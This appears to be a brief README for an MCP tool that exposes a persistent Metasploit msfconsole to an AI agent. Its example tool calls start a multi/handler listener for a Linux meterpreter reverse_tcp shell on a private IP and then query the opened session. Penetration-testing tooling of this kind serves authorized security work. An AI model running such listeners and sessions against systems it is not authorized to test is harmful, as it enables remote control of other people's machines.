# MCP Metasploit

Stateful msfconsole with persistent session. Commands run in the same msfconsole instance across calls.

```json
{"tool": "mcp_msf_console", "args": {"cmd": "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; run -j"}}
{"tool": "mcp_msf_session", "args": {"session_id": "1", "cmd": "sysinfo"}}
```